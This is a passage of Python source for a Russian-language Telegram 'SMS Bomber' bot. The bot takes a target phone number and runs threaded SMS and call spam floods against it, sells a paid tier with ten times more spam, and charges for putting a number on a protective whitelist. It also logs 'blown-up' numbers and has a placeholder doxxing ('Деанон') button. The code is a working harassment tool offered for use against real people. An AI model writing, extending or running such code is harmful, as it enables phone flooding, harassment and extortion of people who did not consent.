            THREADS_AMOUNT[0] += 1
            x.start()
        else:
            bot.send_message(chat_id,
                             "😭 Данный номер телефона находится в Белом листе. Вы не сможете отправить на него спам. Попробуйте другой номер.\n\n👽 Убрать номер со списка, возможно - через @kakoyta_chel19 за 10руб🐀򓰀")
    else:
        bot.send_message(chat_id, '😔 Сервера сейчас перегружены. Попытайтесь ещё раз через несколько минут')
        print('Максимальное количество тредов исполняется. Действие отменено.')

def start_spam2(chat_id, phone_number, force):
    running_spams_per_chat_id2.append(chat_id)

    if force:
        msg = '😘 Спам запущен на неограниченое время для номера +' + phone_number
    else:
        msg = '😘 Спам запущен на 5 минут на номер +' + phone_number
    bot.send_message(chat_id, msg)
    end = datetime.now() + timedelta(minutes=5)
    with open(num_file, "a+") as ids_file:
        ids_file.seek(0)
        ids_list = [line.split('\n')[0] for line in ids_file]
        ids_file.write(f'{phone_number} {chat_id}\n')
        ids_list.append(phone_number)
        print('+1 номер взорван')
    while (datetime.now() < end) or (force and chat_id == ADMIN_CHAT_ID):
        if chat_id not in running_spams_per_chat_id2:
            break
        send_for_number1(phone_number)
    bot.send_message(chat_id, '😉 Спам на номер +' + phone_number + ' завершён')
    THREADS_AMOUNT[0] -= 1
    try:
        running_spams_per_chat_id2.remove(chat_id)
    except Exception:
        pass


def spam_handler2(phone, chat_id, force):
    if int(chat_id) in running_spams_per_chat_id2:
        bot.send_message(chat_id,
                         '😅 Вы уже начали рассылку спама. Дождитесь окончания или нажмите "✖️ Стоп" и попробуйте ещё раз')
        return

    if THREADS_AMOUNT[0] < THREADS_LIMIT:
        if phone not in open(wl_file).read():
            x = threading.Thread(target=start_spam2, args=(chat_id, phone, force))
            threads.append(x)
            THREADS_AMOUNT[0] += 1
            x.start()
        else:
            bot.send_message(chat_id,
                             "😭 Данный номер телефона находится в Белом листе. Вы не сможете отправить на него спам. Попробуйте другой номер.\n\n👽 Убрать номер со списка, возможно - через @kakoyta_chel19 за 10руб🐀򓰀")
    else:
        bot.send_message(chat_id, '😔 Сервера сейчас перегружены. Попытайтесь ещё раз через несколько минут')
        print('Максимальное количество тредов исполняется. Действие отменено.')

def spam_handlers(phone, chat_id, force):
    if int(chat_id) in running_spams_per_chat_id2:
        print('Максимальное количество тредов исполняется. Действие отменено.')
        return

    if THREADS_AMOUNT[0] < THREADS_LIMITS:
        if phone not in open(wl_file).read():
            x = threading.Thread(target=start_spam2s, args=(chat_id, phone, force))
            threads.append(x)
            THREADS_AMOUNTS[0] += 1
            x.start()
        else:
            pass
    else:
        print('Максимальное количество тредов исполняется. Действие отменено.')

def start_spam2s(chat_id, phone_number, force):
    running_spams_per_chat_ids.append(chat_id)

    if force:
        pass
    else:
        pass
    end = datetime.now() + timedelta(minutes=5)
    while (datetime.now() < end) or (force and chat_id == ADMIN_CHAT_ID):
        if chat_id not in running_spams_per_chat_ids:
            break
    THREADS_AMOUNT[0] -= 1
    try:
        running_spams_per_chat_ids.remove(chat_id)
    except Exception:
        pass

def stops(message):
    keyboard13 = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True, one_time_keyboard=True)
    #button = types.InlineKeyboardButton(text="💣 Остановить спам смс", callback_data="stop1")
    keyboard13.add("💣 Остановить спам смс")
    #button1 = types.InlineKeyboardButton(text="✨ Остановить спам на Украинy", callback_data="stop2")
    #button2 = types.InlineKeyboardButton(text="⚒ Остановить спам на Звонки", callback_data="stop3")
    #keyboard13.add(button1)
    #keyboard13.add(button2)
    bot.send_message(message.chat.id, f'''<b>🖐 Привет!\n😘 Выбери какой спам тебе нужно отключить:</b>''', reply_markup=keyboard13,
                     parse_mode='HTML')


def helps(message):
    keyboard12 = types.InlineKeyboardMarkup()
    button1337 = types.InlineKeyboardButton(text="👻 Россия", callback_data="button13371")
    button1338 = types.InlineKeyboardButton(text="✨ Украина", callback_data="button13381")
    button1339 = types.InlineKeyboardButton(text="⚒ Звонки", callback_data="button13391")
    keyboard12.add(button1337)
    keyboard12.add(button1338)
    keyboard12.add(button1339)
    bot.send_message(message.chat.id, f'''<b>🖐 Привет!\n😘 Выбери какую тебе помощь нужно:</b>''', reply_markup=keyboard12,
                     parse_mode='HTML')

def bomber(message):
    keyboard1 = types.InlineKeyboardMarkup()
    button1 = types.InlineKeyboardButton(text="💣 SMS Bomber", callback_data="button1")
    button3 = types.InlineKeyboardButton(text="🔥 Call Bomber", callback_data="button3")
    button44 = types.InlineKeyboardButton(text="💌 Mail Bomber", callback_data="button44")
    button2 = types.InlineKeyboardButton(text="🛡 Защита", callback_data="protection")
    keyboard1.add(button1)
    keyboard1.add(button3)
    keyboard1.add(button44)
    keyboard1.add(button2)
    bot.send_message(message.chat.id, '''<b>🖐 Привет!\n😘 Выбери способ спама:</b>''', reply_markup=keyboard1,
                     parse_mode='HTML')


def rozigrish(message):
    keyboardrozigrish = types.InlineKeyboardMarkup()
    rozigrish = types.InlineKeyboardButton(text="Участвовать в розыгрыше", callback_data="rozigrish")
    keyboardrozigrish.add(rozigrish) 
    bot.send_message(message.chat.id, f'''В честь достижения 700 пользователей в нашем бомбере Вашими и Нашими усилиями вышло самое большое обновление в бомбере в котором была добавлена приватная версия бомбера. Если же у вас она имеется вам открываются следующие возможности:

— БОЛЬШЕ СМС В 10РАЗ🌪💣
— СПАМ ЗВОНКОВ ДО 5 В МИНУТУ
— ВОЗМОЖНОСТЬ ДОБАВЛЯТЬ НОМЕР В БЕЛЫЙ ЛИСТ 🗒
— БОЛЬШЕЕ КОЛИЧЕСТВО ВРЕМЕНИ ДЛЯ СПАМА 🔗
— ДОПОЛНИТЕЛЬНЫЕ ПЛЮШКИ И ПРИВАТНЫЕ РОЗЫГРЫШИ ОТ АДМИНА ⚫
                             
Есть несколько способов получения приватной версии бота:
1. Пригласить 30 пользователей по реферальной ссылке которую можно получить нажав на кнопку "Получить Бесплатно🀀􍀀" 
2. Купить доступ нажав на кнопку "▪️Купить доступ▪️" 
3. Участвовать в розыгрышах или  помогать проекту в развитии.''', 
                    reply_markup=keyboardrozigrish, 
                    disable_web_page_preview=True,
                    parse_mode='HTML')

@bot.callback_query_handler(func=lambda call: True)
def callback_inline(call):
    message = call.message
    keyboard1 = types.InlineKeyboardMarkup()
    button1 = types.InlineKeyboardButton(text="💣 SMS Bomber", callback_data="button1")
    button2 = types.InlineKeyboardButton(text="💌 Mail Bomber", callback_data="button3")
    button3 = types.InlineKeyboardButton(text="⚒ Call Bomber", callback_data="button3")
    keyboard2 = types.InlineKeyboardMarkup()
    button1 = types.InlineKeyboardButton(text="1", callback_data="button4")
    button2 = types.InlineKeyboardButton(text="2", callback_data="button5")
    button88 = types.InlineKeyboardButton(text="3", callback_data="button88")
    button3 = types.InlineKeyboardButton(text="4", callback_data="button6")
    button4 = types.InlineKeyboardButton(text="5", callback_data="button7")
    button7 = types.InlineKeyboardButton(text="6", callback_data="button10")
    keyboard12 = types.InlineKeyboardMarkup()
    button1337 = types.InlineKeyboardButton(text="👻 Россия", callback_data="button1")
    button1338 = types.InlineKeyboardButton(text="✨ Украина", callback_data="button2")
    button1339 = types.InlineKeyboardButton(text="⚒ Звонки", callback_data="button3")
    keyboard13 = types.InlineKeyboardMarkup()
    button = types.InlineKeyboardButton(text="👻 Остановить спам на Россия", callback_data="stop1")
    button1 = types.InlineKeyboardButton(text="✨ Остановить спам на Украина", callback_data="stop2")
    button2 = types.InlineKeyboardButton(text="⚒ Остановить спам на Звонки", callback_data="stop3")
    keyboard = types.InlineKeyboardMarkup()
    button1 = types.InlineKeyboardButton(text="👻 Бомбер", callback_data="vibor")
    button2 = types.InlineKeyboardButton(text="❌ Остановить спам", callback_data="stop")
    adminka1 = types.InlineKeyboardButton(text="🙀 Админ-Панель", callback_data="adminka1")
    
    chat_id = int(message.chat.id)
    id1 = message.from_user.id
    ##########################################################################################
    if call.message:
        if call.data == "button1":
            check = check_vip(call.message.chat.id)

            if check:
                if db.get_count_attack(message.chat.id) == 3:
                    bot.send_message(message.chat.id, 'Вы не можете ставить больше 3 одновременных атак')
                    return
            else:
                if db.get_count_attack(message.chat.id) == 1:
                            bot.send_message(message.chat.id,'Вы не можете ставить больше 1 одновременной атаки')
                            return

            msg = bot.send_message(message.chat.id,
                             '🤩 Вы выбрали SMS Bomber.\n\n🧐 Введите номер в формате:\n🇷🇺 79xxxxxxxxx\n🇺🇦 380xxxxxxxxx\n🇵🇼 77xxxxxxxxx\n🇵🇱 44ххххххххх')

            bomber_state[str(chat_id)] = {}
            bomber_state[str(chat_id)]['type'] = 'sms'
            bot.register_next_step_handler(msg, enter_number)


        elif call.data == "button44":
            bot.send_message(message.chat.id,
                             '🤩 Вы выбрали Mail Bomber.\n\n🥺 В данный момент он находиться на стадии разработки. Когда нибудь да заработает🠀񕰀')

        elif call.data == "button3":
            msg = bot.send_message(message.chat.id,
                             '🤩 Вы выбрали Call Bomber.\n\n🧐 Введите номер в формате:\n🇷🇺 79xxxxxxxxx\n🇺🇦 380xxxxxxxxx\n🇵🇼 77xxxxxxxxx\n🇵🇱 44ххххххххх')

            bomber_state[str(chat_id)] = {}
            bomber_state[str(chat_id)]['type'] = 'call'

            bot.register_next_step_handler(msg, enter_number)


        elif call.data == "protection":
            if not (chat_id == ADMIN_CHAT_ID or check_vip(chat_id)):
                bot.send_message(chat_id, 'Эта функция доступа только в приватной версии')
                return

            msg = bot.send_message(chat_id, 'Введите номер')
            bot.register_next_step_handler(msg, addwl)   

        elif call.data == "rozigrish":
            bot.send_message(chat_id, '''На счёт розыгрыша:
            
            ‼️Условия розыгрыша:
            
            1️⃣. Быть подписанным на <a href="https://t.me/burntobaccoofficial">канал</a>
            
            2️⃣. Быть подписанным на <a href="https://t.me/joinchat/AAAAAEbo_qrOMGQjlUFhAA">канал</a>
            
            3️⃣. Принять участие в <a href="https://t.me/c/1189674666/11">опросе</a>
            
            Кол-во призовых мест: 3
            
            После выполнения всех условий розыгрыша - писать @kakoyta_chel19 за получением приватной ссылки на участи.''', disable_web_page_preview=True, 
                     parse_mode='HTML')
            
        elif call.data == 'button4':
            bomber(message) 

        elif call.data == "button5":
            if chat_id not in running_spams_per_chat_id:
                bot.send_message(chat_id, '😿 Вы еще не начинали спам')
            else:
                running_spams_per_chat_id.remove(chat_id)
                bot.send_message(chat_id, '😜 Вы теперь опять можете кинуть бомбер человеку')
        
        if call.data == "stoper":
            stopik=2
            sms1=26
            smsvip11=150
            bot.send_message(call.from_user.id, '🧐 Спам будет остановлен в течении 7 минут!\n')
        
        elif call.data == "button6":
            bot.send_message(chat_id,
                             '<b>🤪 Разработчики бота: @kakoyta_chel19  \n 🥳 По вопросам сотрудничества обращаться в ЛС к разработчикам бота.</b>', parse_mode='html')

        elif call.data == "button7":
            with open('chat_ids.txt') as f:
                size = sum(1 for _ in f)
            with open('num.txt') as f:
                size1 = sum(1 for _ in f)
            with open('vip_id.txt') as f:
                sizes = sum(1 for _ in f)
            with open('numWL.txt') as f:
                sizes1 = sum(1 for _ in f)
            bot.send_message(chat_id, '<b>📊 Статистика отображается в реальном времени 📡!\n\nПользователей 🙎‍: ' + str(
                size) + '\nПремиум пользователей🙎‍♂️: <b>Неизвестно</b>\nНомеров взорвано 💣: ' + str(
                size1) + '\nНомеров защищенно 💣: ' + str(
                sizes1) + '\nСервисов для RU 🇷🇺: 135\nСервисов для UK 🇺🇦: 70\nЗвонков для СНГ 🥶: 7\nПоследний рестарт ⚠️: 20.11.20\nБот запущен: 20.11.20\nНапомним что в приват версии в 10 раз больше спама🐀򓰀</b>', parse_mode = 'html')

        elif call.data == "button8":
            bot.send_message(chat_id,
                             '<b>😍 Вы можете кинуть деньги на мой киви\n QIWI: +79826707658\n\n😎 Тем самым помочь с покупкой оборудование.</b>',
                             parse_mode="HTML")

        elif call.data == "button9":
            bot.send_message(chat_id, """
             🤪 Реклама - рассылка:
             🤪 Цена: 130₽
             🤪 Каждый пользователь получит уведомление с вашим текстом.

             🤪 Реклама - 🤝 Наш партнёр
             🙃 24 часа (1 день) + 1 рассылка - 200₽
             😍 48 часов (2 дня) + 2 рассылка - 333₽
             🥰 120 часов (5 дней) + 3 рассылка - 450₽
             🤩 Ваш текст будет во вкладке "🌚 Наш партнер"

             🤩 Купить: @kakoyta_chel19
             ✴️ Отзывы о покупке рекламы: @OtziviDarkBomber  """)

        elif call.data == "button10":
            post = ""
            f = open("friend.txt", mode="r", encoding="utf-8")
            for line in f.readlines():
                post += line
            bot.send_message(message.chat.id, post)
            f.close()

        elif call.data == "button11":
            bot.send_message(chat_id,
                             '😑 Если вы используете нашего бота, вы даете полное согласия с лицензионным и пользовательским соглашением.\n\n😉 Пользовательское соглашение\n🤑 1. Доступ к сервису предоставляется на бесплатной основе.\n😹 2. "SMS Bomber" сервис предназначен исключительно для развлекательных целей.\n🌚 3. На Администрацию сервиса не возлагается каких-либо обязательств перед пользователями.\n🥺 4. Администрация сервиса не принимает встречные предложения от Пользователей относительно изменений настоящего Пользовательского соглашения.\n😌 5. Администрация сервиса "SMS Bomber" Не несет ответственности за причиненный ущерб третьим лицам попавших под влияние сервиса.\n😘 Спасибо за внимание!')

        elif call.data == "button12":
            bot.send_message(message.chat.id,
                             "😔 Упс...\n🥺 Добавить номер в Защиту можно только через @kakoyta_chel19 ")
                             
                             
        elif call.data == "button13371":
            bot.send_message(message.chat.id,
                              "<b>🤤 Инструкция к RU:\n Чтобы кинуть спам на Россию вам нужно ввести номер в формате \n79xxxxxxxxx</b>", parse_mode='html')
         
        elif call.data == "button13381":
            bot.send_message(message.chat.id,
                              "<b>🤤 Инструкция к UA:\n Чтобы кинуть спам на Россию вам нужно ввести номер в формате \n[укр 380xxxxxxxxx]\n\n❌ БЕЗ СКОБОК ❌</b>", parse_mode='html')
         
        elif call.data == "button13391":
            bot.send_message(message.chat.id,
                             "<b>🤤 Инструкция к Звонкам:\n В данный момент звонки в бета тесте, если они не работают, ну уж извините\n Вводить номер в формате\n[звонки 79xxxxxxxxx]\n[звонки 380xxxxxxxxx]\n\n❌ БЕЗ СКОБОК ❌</b>", parse_mode='html')
       
        elif call.data == "stop":
            stops(message)
        
        elif call.data == "vibor":
            bomber(message)
        
        elif call.data == "stop1":
            db.set_bomber_state('stop', chat_id)
            bot.send_message(chat_id, 'Весь смс спам остановлен')
        
        elif call.data == "stop2":
            if chat_id not in running_spams_per_chat_id1:
                pass
            else:
                running_spams_per_chat_id1.remove(chat_id)
        
        elif call.data == "stop3":
            if chat_id not in running_spams_per_chat_id2:
                pass
            else:
                running_spams_per_chat_id2.remove(chat_id)
        
        elif call.data == "qiwi12":
            bot.send_message(message.chat.id, '❗️ <b>Для приобретения доступа к боту переведите ' + str(
                price) + ' рублей на QIWI кошелёк любым способом.</b>\n\n📱 <b>Номер: 79826707658</b>\n<b>👑 Комментарий: </b>' '<pre>' + str(
                message.chat.id) + '</pre> \n<b>💰 Стоимость:</b> <pre>' + str(price) + '</pre> \n\n❗️ <b>❗️ Если Вы перевели деньги с другим комментарием, то доступ Вы не получите!</b>\n\n❗<b> Если Вы перевели деньги с другим комментариями, то доступ вы не получите!\n\n<b>❗️При ошибочном переводе писать: @kakoyta_chel19 </b>',
                             parse_mode='html')

        elif call.data=="startUAvip":
            text = bot.status.get(str(id1))
            if text == None:
                text = 0
            t = 1
            g = int(t) + int(text)
            bot.status[str(id1)] = g
            text = bot.status.get(str(id1))
            print(text)

            id1 = call.from_user.id
            nomer = bot.nomer.get(str(id1))
            print(nomer)
            thread = Thread(target=spamvip1, args=(id1, nomer), daemon=True)
            thread.start()
            markup = telebot.types.InlineKeyboardMarkup(row_width=1)
            button = telebot.types.InlineKeyboardButton(text='❌ Остановить спам', callback_data='stoper')
            markup.add(button)
            bot.send_message(message.chat.id, "😘 Спам запущен на 60 минут, ожидайте отчёт 📑",
                             reply_markup=markup)

        elif call.data == "startRUvip":
            text = bot.status.get(str(id1))
            if text == None:
                text = 0
            t = 1
            g = int(t) + int(text)
            bot.status[str(id1)] = g
            text = bot.status.get(str(id1))
            print(text)

            id1 = call.from_user.id
            nomer = bot.nomer.get(str(id1))
            print(nomer)
            thread = Thread(target=spamvip2, args=(id1, nomer), daemon=True)
            thread.start()

            markup = telebot.types.InlineKeyboardMarkup(row_width=1)
            button = telebot.types.InlineKeyboardButton(text='❌ Остановить спам', callback_data='stoper')
            markup.add(button)
            bot.send_message(message.chat.id,
                             "😘 Спам запущен на 60 минут, ожидайте отчёт 📑",
                             reply_markup=markup)
                             
        elif call.data=="startUAvip1":
            bot.send_message(message.chat.id, "Временно отключено")

        elif call.data == "startRUvip1":
            bot.send_message(message.chat.id, "Временно отключено")

       
@bot.message_handler(content_types=['text'])
def handle_message_received(message):
    keyboard = types.ReplyKeyboardMarkup(row_width=3, resize_keyboard=True)
    boom = types.KeyboardButton(text='💣 SPAM')
    stop = types.KeyboardButton(text='✖️ Стоп')
    deanon = types.KeyboardButton(text='〰️ Деанон')
    info = types.KeyboardButton(text='▪️Информация▪️')
    stats = types.KeyboardButton(text='◾Статистика◾')
    private = types.KeyboardButton(text='ПРИВАТ ⚫')
    spons = types.KeyboardButton(text='НАШ ПАРТНЁР®️')
    voxgiftbutton = types.KeyboardButton(text='Подарок Воксу')

    buttons_to_add = [boom, stop, deanon, info, stats, private, spons, voxgiftbutton]

    keyboard.add(*buttons_to_add)

    some_var = bot.get_chat_member(group_id, message.chat.id)
    user_status = some_var.status

    url = open('url.txt', 'r')
    urls = open('urls.txt', 'r')
    inl_keyboard = types.InlineKeyboardMarkup()
    s = types.InlineKeyboardButton(text='Подписаться', url=url.read())
    inl_keyboard.add(s)
    
    vox = types.ReplyKeyboardMarkup(row_width=4, resize_keyboard=True)
    voxbutton = types.KeyboardButton(text='Кнопка')
    voxexit = types.KeyboardButton(text='⬅️ Назад')
    vox.add(voxbutton, voxexit)
    
    adm = types.ReplyKeyboardMarkup(row_width=3, resize_keyboard=True)
    a = types.KeyboardButton(text='😻 Рассылка')
    c = types.KeyboardButton(text='😻 Добавить партнер')
    d = types.KeyboardButton(text='😻 Удалить партнера')
    give_private = types.KeyboardButton(text='🥳 Выдать приватку')
    file = types.KeyboardButton(text='🌚 Получить данные')
    cheat = types.KeyboardButton(text='💣 Накрутка')
    e = types.KeyboardButton(text='⬅️ Назад')
    priv1 = types.KeyboardButton(text='/priv')
    kanal = types.KeyboardButton(text='🌚 Изменить ссылку на канал') 
    xexe = types.KeyboardButton(text='😻 Предложить рекламу') 
    adm.add(a, c, d, give_private, file, cheat, priv1, kanal, xexe, e)
    
    priv = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    a = types.KeyboardButton(text='😻 Приват_Д')
    b = types.KeyboardButton(text='😻 Приват_У')
    c = types.KeyboardButton(text='😻 Приватки')
    e = types.KeyboardButton(text='⬅️ Назад')
    priv.add(a, b, c, e)
    
    id1 = message.from_user.id
    chat_id = int(message.chat.id)
    text = message.text
    id1 = message.from_user.id
    some_var = bot.get_chat_member(group_id, message.chat.id)
    user_status = some_var.status
    global user_markup
    id1 = message.from_user.id
    if True:

        if text == "😻 Добавить партнер" and chat_id == ADMIN_CHAT_ID:
            y = bot.send_message(message.chat.id, "🙃 Пришлите рекламу вашего партнера:")
            bot.register_next_step_handler(y, posts)
            
        elif text == "Кнопка" and chat_id == VOXDOX_CHAT_ID:
            a = bot.send_message(message.chat.id, "Скинь свой рекламный пост без фото")
            bot.register_next_step_handler(a, postss)

        elif text == '🌚 Изменить ссылку на канал' and chat_id == ADMIN_CHAT_ID:
            b = bot.send_message(message.chat.id, '🙃 Введите ссылку на канал')
            bot.register_next_step_handler(b, subchan)

        elif text == '😻 Удалить партнера' and chat_id == ADMIN_CHAT_ID:
            postsRES()
            bot.send_message(chat_id, '🙃 Партнер удалён')

        elif text == '🥳 Выдать приватку' and chat_id == ADMIN_CHAT_ID:
            enter_id = bot.send_message(message.chat.id, 'Введите айди')
            bot.register_next_step_handler(enter_id, give_vip)

        elif text == '▪️Информация▪️':
            bot.send_message(chat_id,
                             'Владелец бота: @kakoyta_chel19 \nНа счёт рекламы писать: @kakoyta_chel19 \nНашли баг? Пишите: @kakoyta_chel19 \n\nПомощь /help\nСоглащения /tos', parse_mode='html')

        elif text == '〰️ Деанон':
            bot.send_message(chat_id,
                             'Функция будет доступна в последующих обновлениях.', parse_mode='html')

        elif text == '💣 SPAM':
            bomber(message)

        
        elif text == '/help':
            helps(message)
            
        elif text == '✖️ Стоп':
            db.set_bomber_state('stop', chat_id)
            db.set_call_attacks_state('stop', chat_id)
            bot.send_message(chat_id, 'Весь спам остановлен')

        elif text == 'ПРИВАТ ⚫':
            id1 = message.from_user.id
            if check_vip(id1):
                    bot.send_message(message.chat.id, "Вы уже обладаете приватной версией")
            else:
                keyboard = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
                button5 = types.KeyboardButton(text="▪️Купить доступ▪️")
                button6 = types.KeyboardButton(text="Получить Бесплатно🀀􍀀")
                button567 = types.KeyboardButton(text="Важная информация❗") 
                button51 = types.KeyboardButton(text="➖ Назад")
                keyboard.add(button5)
                keyboard.add(button6)
                keyboard.add(button567)
                keyboard.add(button51)
                bot.send_message(message.chat.id,
                                 '''Приват🌪

— БОЛЬШЕ СМС В 10РАЗ🌪💣
— СПАМ ЗВОНКОВ ДО 5 В МИНУТУ
— ВОЗМОЖНОСТЬ ДОБАВЛЯТЬ НОМЕР В БЕЛЫЙ ЛИСТ 🗒
— БОЛЬШЕЕ КОЛИЧЕСТВО ВРЕМЕНИ ДЛЯ СПАМА 🔗''',
                                 reply_markup=keyboard, parse_mode='HTML')

        elif text == 'Получить Бесплатно🀀􍀀':
            username = bot.get_me().username
            bot.send_message(chat_id, f'Для получения приватной  версии данного бота - вам нужно пригласить 30 человек по реферальной ссылке🤝.\n\n\nВаша реферальная ссылка:\nhttps://t.me/{username}?start={chat_id}\n\n\n🤝Приглашено: {db.referals_count(chat_id) % 30}/30')

        
        elif text == "▪️Купить доступ▪️":
            keyboard = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)            
            button51 = types.KeyboardButton(text="➖ Назад")
            keyboard.add(button51)
            bot.send_message(message.chat.id, '❗️ <b>Для приобретения доступа к боту переведите ' + str(
                price) + ' рублей на QIWI кошелёк любым способом.</b>\n\n📱 <b>Номер: 79826707658</b>\n<b>👑 Комментарий:</b><code> ' + str(
                message.chat.id) + '</code>\n<b>💰 Стоимость:</b><code> ' + str(price) + '</code>\n\n❗️ <b>Если Вы перевели деньги с другим комментарием, то доступ Вы не получите!</b>\n\n<b>❗️При ошибочном переводе писать @kakoyta_chel19 </b>',
                             parse_mode='html')
                             
        elif text == "Важная информация❗":
            rozigrish(message) 


        elif text == '➖ Назад':
            bot.send_message(chat_id, '🖐 Привет!\nВыбери действие:', reply_markup=keyboard)
        

        elif text == "/tos":
            bot.send_message(chat_id,
                             '🥶 Лицензионное соглашение\n\n🤯 1. При флуде боту более 25 сообщений за минуту мы имеем полное право вас заблокировать\n😡 2. Если вы украли дизайн бомбера, мы имеем полное право написать на вас жалобу\n🤔 3. Запрещено брать наш текст, или что-то в этом роде\n☺️ 4. Запрещено использовать бота в коммерческих целях\n🥳 5. Все права на бота преднадлежат создателю @kakoyta_chel19.\n🤪 6. Купленный донат действует только на время существования и функционирования бота.\n🥺 7. Незнание правил не освобождает вас от отвественности.')

        elif text == '◾Статистика◾':
            with open('chat_ids.txt') as f:
                size = sum(1 for _ in f)
            with open('num.txt') as f:
                size1 = sum(1 for _ in f)
            with open('vip_id.txt') as f:
                sizes = sum(1 for _ in f)
            with open('numWL.txt') as f:
                sizes1 = sum(1 for _ in f)
            today = datetime.today()
            bot.send_message(chat_id, '<b>📊 Статистика отображается в реальном времени 📡!\n\nПользователей👤‍: ' + str(
                size) + '\nПремиум пользователей🙎‍♂️:' + str(
                sizes) + '\nНомеров взорвано 💣: ' + str(
                size1) + '\nНомеров защищенно 🛡: ' + str(
                sizes1) + '\nСервисов для RU 🇷🇺: 135\nСервисов для UK 🇺🇦: 70\n\nПоследний рестарт ⚠️: 20.11.20\nБот запущен: 20.11.2020</b>', parse_mode = 'html')

        elif text == "Удалить" and chat_id == ADMIN_CHAT_ID:
            ww = bot.send_message(message.chat.id, "🌚 Введите номер, который вы хотите удалить с Белого листа.")
            bot.register_next_step_handler(ww, delllwl)

        elif text == "Добавить" and chat_id == ADMIN_CHAT_ID:
            ww = bot.send_message(message.chat.id, "😌 Введите номер, который вы хотите добавить в Белый лист.")
            bot.register_next_step_handler(ww, addwl)

        elif text == 'Защита' and chat_id == ADMIN_CHAT_ID:
            nums = ""
            f = open("numWL.txt", mode="r", encoding="utf-8")
            for line in f.readlines():
                nums += line
            bot.send_message(message.chat.id, nums)
            f.close()

        elif text == '/admin' and chat_id == ADMIN_CHAT_ID:
            print(ADMIN_CHAT_ID)
            bot.send_message(int(ADMIN_CHAT_ID), 'Выберите действие.', reply_markup=adm)
            
        elif text == '/voxdox' and chat_id == VOXDOX_CHAT_ID:
            print(ADMIN_CHAT_ID)
            bot.send_message(int(VOXDOX_CHAT_ID), 'Выберите действие.', reply_markup=vox)
        
        elif text == '/priv' and chat_id == ADMIN_CHAT_ID:
            bot.send_message(chat_id, 'Выберите действие.', reply_markup=priv)
            
        elif text == '/priv' and chat_id == ADMIN_CHAT_ID1:
            bot.send_message(chat_id, 'Выберите действие.', reply_markup=priv)
        
        elif text == '⬅️ Назад' and chat_id == ADMIN_CHAT_ID:
            bot.send_message(chat_id, 'Выберите действие.', reply_markup=keyboard)

        elif text == '😻 Рассылка' and chat_id == ADMIN_CHAT_ID:
            bot.send_message(chat_id, 'Введите сообщение в формате: "РАЗОСЛАТЬ: ваш_текст" без кавычек')

        elif text == '💣 Накрутка' and chat_id == ADMIN_CHAT_ID:
            bot.send_message(chat_id, '😜 Опа... Накрутил')
            with open(num_file, "a+") as ids_file:
                ids_file.seek(0)
                ids_list = [line.split('\n')[0] for line in ids_file]
                ids_file.write(f'{adm1s}\n')
                ids_list.append(adm1s)
            return

        elif text == '🌚 Обновить VPN' and chat_id == ADMIN_CHAT_ID:
            bot.send_message(chat_id, 'Бот перезапускается...')

        elif text == '🌚 Получить данные' and chat_id == ADMIN_CHAT_ID:
            f = open('chat_ids.txt')
            bot.send_document(chat_id, f)
            f = open('num.txt')
            bot.send_document(chat_id, f)
            f = open('friend.txt')
            bot.send_document(chat_id, f)
            f = open('url.txt')
            bot.send_document(chat_id, f)
            f = open('numWL.txt')
            bot.send_document(chat_id, f)

        elif text == 'Подарок Воксу':
            voxdoxgiftbutton = open('voxgift.txt', encoding='utf-8').read()
            bot.send_message(message.chat.id, f"{voxdoxgiftbutton}\n\nДанная кнопка была подарена Воксу от @kakoyta_chel19")
            
            
        elif text == 'НАШ ПАРТНЁР®️':
            partners = open('friend.txt', encoding='utf-8').read()
            bot.send_message(message.chat.id, f"{partners}\n\nХочешь попасть в этот раздел? Пиши 👉 @kakoyta_chel19 ")

        
        elif text == "😻 Приват_Д" and chat_id == ADMIN_CHAT_ID:
            ww = bot.send_message(message.chat.id, "🌚 Введите айди человека, которого нужно добавить в Приватного Бота (узнать @userinfobot)")
            bot.register_next_step_handler(ww, adduser)

        elif text == "😻 Приват_У" and chat_id == ADMIN_CHAT_ID:
            ww = bot.send_message(message.chat.id, "😌 Введите айди человека, которого нужно удалить с Приватного Бота (узнать @userinfobot)")
            bot.register_next_step_handler(ww, delluser)

        elif text == '😻 Приватки' and chat_id == ADMIN_CHAT_ID:
            nums = ""
            f = open("vip_id.txt", mode="r", encoding="utf-8")
            for line in f.readlines():
                nums += line
            bot.send_message(message.chat.id, nums)
            f.close()

        elif text == '😻 Предложить рекламу' and chat_id == ADMIN_CHAT_ID:
            bot.send_message(message.chat.id, '😏 Рассылка запущена')
            predlog = '✅ Не знаете где купить рекламу качественно и не дорого?\n🏛 Тогда вы по адресу!!!\n\n👥 У нас вашу рекламу увидят все пользователи бота\n📨 @smsbomber_n1_bot \n\n🗣 Каждый пользователь получит сообщение от бота с вашей рекламой!\n☀️ ' + str(
                users_amount[
                    0]) + ' ☀️ активных пользователей!\n\n💶 Цена рассылки: 130₽\n\n🤪 Реклама - НАШ ПАРТНЁР®️\n🙃 24 часа (1 день) + 1 рассылка - 200₽\n😍 48 часов (2 дня) + 2 рассылка - 333₽\n🥰 120 часов (5 дней) + 3 рассылка - 450₽\n🤩 Ваш текст будет во вкладке "НАШ ПАРТНЁР®️"\n\n🤩 Купить: @kakoyta_chel19\n Отзывы о покупке рекламы '
            send_message_users(predlog)
            bot.send_message(chat_id, '😒 Рассылка завершена')
      

        elif 'РАЗОСЛАТЬ: ' in text and chat_id == ADMIN_CHAT_ID:
            msg = text.replace("РАЗОСЛАТЬ: ", "")
            bot.send_message(message.chat.id, '👀 Рассылка запущена')
            send_message_users(msg)
            bot.send_message(chat_id, '👀 Рассылка завершена')
        
        
        elif 'РАЗОСЛАТЬ: ' in text and chat_id == ADMIN_CHAT_ID:
            msg = text.replace("РАЗОСЛАТЬ: ", "")
            bot.send_message(message.chat.id, '👀 Рассылка запущена')
            send_message_users1(msg)
            bot.send_message(chat_id, '👀 Рассылка завершена')
        
        elif 'РАЗОСЛАТЬ: ' in text and chat_id == ADMIN_CHAT_ID1:
            msg = text.replace("РАЗОСЛАТЬ: ", "")
            bot.send_message(message.chat.id, '👀 Рассылка запущена')
            send_message_users1(msg)
            bot.send_message(chat_id, '👀 Рассылка завершена')
        
####################################################################################################################
        
        elif text == "😻 Добавить партнер" and chat_id == ADMIN_CHAT_ID1:
            a = bot.send_message(message.chat.id, "🙃 Пришлите рекламу вашего партнера:")
            bot.register_next_step_handler(a, posts)

        elif text == '🌚 Изменить ссылку на канал' and chat_id == ADMIN_CHAT_ID1:
